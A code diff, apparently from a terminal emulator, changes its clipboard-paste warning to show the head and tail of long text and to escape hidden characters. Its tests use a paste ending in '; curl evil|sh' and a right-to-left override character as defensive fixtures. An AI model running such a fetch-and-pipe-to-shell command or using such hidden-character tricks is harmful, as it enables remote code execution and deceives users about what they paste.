@@ -348,6 +348,32 @@ fn sizeText(buf: []u8, n: usize) []const u8 {
     unreachable;
 }
 
+/// The text a clipboard prompt shows: all of it when it has at most
+/// `max_chars` characters, else its first and last `max_chars / 2`
+/// characters with an ellipsis line between them, so that what a paste ends
+/// with (the part that runs last) is never hidden. Hidden characters are
+/// written out in both halves. Caller owns the result.
+fn headTailPreview(alloc: Allocator, text: []const u8, max_chars: usize) ![]u8 {
+    var total: usize = 0;
+    var at: usize = 0;
+    while (at < text.len) : (total += 1) _ = dtext.nextCodepoint(text, &at);
+    if (total <= max_chars) return escapeDeceptive(alloc, text, .paste, max_chars);
+
+    const half = max_chars / 2;
+    var head_end: usize = 0;
+    for (0..half) |_| _ = dtext.nextCodepoint(text, &head_end);
+    var tail_start = head_end;
+    for (0..total - 2 * half) |_| _ = dtext.nextCodepoint(text, &tail_start);
+
+    // Room for every character to be written out as <U+XXXX>.
+    const room = half * 10;
+    const head = try escapeDeceptive(alloc, text[0..head_end], .paste, room);
+    defer alloc.free(head);
+    const tail = try escapeDeceptive(alloc, text[tail_start..], .paste, room);
+    defer alloc.free(tail);
+    return std.fmt.allocPrint(alloc, "{s}\n\u{2026}\n{s}", .{ head, tail });
+}
+
 /// Builds what `confirmClipboard` shows. `max_w` and `max_h` (px) bound the
 /// picture.
 fn buildClipboardPrompt(
@@ -406,8 +432,7 @@ fn buildClipboardPrompt(
         }
     };
     if (text) |t| if (t.len > 0) {
-        // Enough bytes for the characters shown, however they are escaped.
-        const shown = try escapeDeceptive(alloc, t[0..@min(t.len, 4096)], .paste, clipboard_text_chars);
+        const shown = try headTailPreview(alloc, t, clipboard_text_chars);
         defer alloc.free(shown);
         try list.appendSlice(alloc, if (list.items.len > 0) "\n\n" else "");
         try list.appendSlice(alloc, shown);
@@ -831,14 +856,33 @@ test "win32 dialogs: the text of a part that is not text/plain" {
     var none = try buildClipboardPrompt(alloc, .read, &.{}, 500, 200);
     defer none.deinit(alloc);
     try std.testing.expectEqualStrings("", none.list);
-    // The text shown is cut at 512 characters.
-    const big: [5000]u8 = @splat('y');
-    const y512: [512]u8 = @splat('y');
+    // Long text keeps its head and its tail, 256 characters each.
+    var big: [5000]u8 = @splat('y');
+    @memcpy(big[big.len - 14 ..], "; curl evil|sh");
     const parts = [_]ClipboardPart{.{ .mime = "text/plain", .data = &big }};
     var cut = try buildClipboardPrompt(alloc, .paste, &parts, 500, 200);
     defer cut.deinit(alloc);
+    const y256: [256]u8 = @splat('y');
     const at = std.mem.indexOf(u8, cut.list, "\n\n").? + 2;
-    try std.testing.expectEqualStrings(y512 ++ "\u{2026}", cut.list[at..]);
+    const shown = cut.list[at..];
+    try std.testing.expect(std.mem.startsWith(u8, shown, &y256 ++ "\n\u{2026}\n"));
+    try std.testing.expect(std.mem.endsWith(u8, shown, "; curl evil|sh"));
+    try std.testing.expectEqual(@as(usize, 256 + "\n\u{2026}\n".len + 256), shown.len);
+
+    // Text of exactly the limit is shown whole.
+    const exact: [512]u8 = @splat('z');
+    const whole = [_]ClipboardPart{.{ .mime = "text/plain", .data = &exact }};
+    var full = try buildClipboardPrompt(alloc, .paste, &whole, 500, 200);
+    defer full.deinit(alloc);
+    try std.testing.expectEqualStrings(&exact, full.list[std.mem.indexOf(u8, full.list, "\n\n").? + 2 ..]);
+
+    // Hidden characters in the tail are written out too.
+    var evil: [1000]u8 = @splat('a');
+    @memcpy(evil[evil.len - 5 ..], "\u{202E}xy");
+    const bidi = [_]ClipboardPart{.{ .mime = "text/plain", .data = &evil }};
+    var shown_evil = try buildClipboardPrompt(alloc, .paste, &bidi, 500, 200);
+    defer shown_evil.deinit(alloc);
+    try std.testing.expect(std.mem.endsWith(u8, shown_evil.list, "<U+202E>xy"));
 }
 
 test "win32 dialogs: every close kind has its own sentence" {
